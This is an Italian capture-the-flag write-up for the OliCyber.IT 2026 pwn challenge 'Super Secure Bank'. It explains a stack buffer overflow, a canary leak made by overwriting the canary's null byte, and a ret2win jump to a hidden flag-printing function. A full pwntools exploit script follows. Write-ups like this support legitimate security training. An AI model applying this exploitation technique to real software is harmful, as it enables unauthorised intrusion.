# OliCyber.IT 2026 - Selezione Territoriale

## [pwn] Super Secure Bank (18 solves)

Non riuscirete mai a forzare la mia Super Secure Bank!

`nc super-secure-bank.challs.olicyber.it 38080`

Author: Vincenzo Bonforte <@Bonfee>, Giulia Martino <@Giulia>

## Panoramica

La challenge è un binario ELF semplice che fornisce un servizio bancario con un menu:

```text
Menu:
1. Deposit
2. Get rich
3. Exit
>
```

Controllando con `checksec` scopriamo le mitigazioni attive nel binario:

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Il canary è presente, ma PIE è disabilitato.  
Si procede ad analizzare il binario in un decompiler, per esempio Ghidra.  
Scopriamo così che l'opzione `Deposit` chiama la funzione `deposit()`.  
Questa funzione fa essenzialmente 4 operazioni:

1. Chiede all'utente di inserire la `bank name length`, che deve essere massimo 15, e salva questo valore in una variabile di tipo `uint8_t` sullo stack.
2. Legge il `credit card pin` dell'utente salvandolo in un buffer sullo stack, usando la funzione `read_digits()`
3. Stampa a `stdout` il `credit card pin` appena letto, usando `printf("%s")`
4. Legge il `bank name` dell'utente salvandolo in un buffer sullo stack, usando la funzione `read_exactly()` e passandogli come dimensione della read il `bank name length` precedentemente letto, sanitizzato e salvato su una variabile sullo stack.

L'opzione `Get rich` stampa `Sorry this function is not available yet`.  
Tuttavia la sua presenza ci aiuta a trovare la funzione nascosta `get_rich()`, che legge la flag e la stampa su `stdout`.

## Soluzione

La funzione `read_digits()` legge un carattere alla volta (assicurandosi che sia un numero) e si ferma soltanto quando viene letto un newline (`\n`).  
Quindi nella funzione `deposit()`, quando viene chiamata `read_digits()` passandogli come parametro la variabile sullo stack `char credit_card_pin[4]`, avremo un buffer overflow.

La strategia per risolvere la chall consiste nello sfruttare questo buffer overflow per leakare il canary e abilitare un secondo buffer overflow che non presenti la limitazione imposta da `read_digits()`.

Per leakare il canary possiamo, tramite il buffer overflow, sovrascrivere l'ultimo byte del canary (che è sempre impostato al byte `0x00`) con il newline che fa terminare la lettura in `read_digits()`, in questo modo non appena il programma ci stamperà il `credit card pin` appena letto verrà anche leakato il canary.  
Per arrivare a sovrascrivere il primo byte del canary dovremo mandare:

- 4 byte per riempire il buffer `char credit_card_pin[4]`
- 1 byte per riempire la variabile `uint8_t bank_name_len`
- 3 byte di padding
- newline finale

```bash
$ ./attachments/supersecurebank
Menu:
1. Deposit
2. Get rich
3. Exit
>
Choice: 1
Insert your bank name length (max 15): 4
Ok..... bank name length valid
Insert your credit card pin: 11110222
Ok..... credit card pin is: 11110222
�=M}�(S
```

Possiamo già notare che stiamo sovrascrivendo anche la variabile `bank_name_len`, che verrà usata successivamente per chiamare `read_exactly` e leggere il `bank name` nel buffer sullo stack `char bank_name[16]`.

Usando il carattere `0` andremo a impostare `bank_name_len` al valore `0x30`, ottenendo un overflow di `32 bytes`, abbastanza per arrivare a sovrascrivere il return address sullo stack e chiamare la funzione `get_rich()`.

## Exploit

```py
#!/usr/bin/env python3
from pwn import *

HOST = os.environ.get("HOST", "super-secure-bank.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 38080))

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
exe = ELF(os.path.join(SCRIPT_DIR, "supersecurebank"), checksec=False)

while True:
    r = remote(HOST, PORT)

    r.sendlineafter(b"Choice: ", b"1") # Deposit
    r.sendlineafter(b": ", b"12") # Bank name length, whatever value, we will overwrite this

    # Credit card number, only digits, we can overwrite the bank name length using this bof
    # '0' is 0x30 in ascii, bank name length is now 0x30
    # Add 3 extra bytes (b'0' * 3) to reach canary
    # Last byte of canary is overwritten by newline
    pin = b"1"*4 + b'0' + b"0"*3 + b"\n"
    r.sendafter(b": ", pin)

    r.recvuntil(b": " + pin)
    canary = r.recvuntil(b"Insert your bank name", drop = True)
    print(canary)

    # There must be at least 7 byte of canary
    if len(canary) < 8:
        # Canary contained null byte, retry
        r.close()
        continue

    canary = b"\x00" + canary[:7]
    print(f"Canary leak: {hex(int(canary.hex(), 16))}")

    # Padding : bank_name (16 bytes) + credit_card_pin (4 bytes) + name_len (4 bytes)
    # Canary + RBP + RIP
    win_func = p64(exe.sym.get_rich)
    payload = b"A"*16 + b"A"*4 + b"A"*4 + canary + b"A"*8 + win_func
    assert len(payload) == 0x30
    r.sendafter(b": ", payload)

    r.recvuntil(b"flag{")
    flag = r.recvuntil(b"}").decode()
    flag = "flag{" + flag
    print(flag)
    r.close()
    break
```
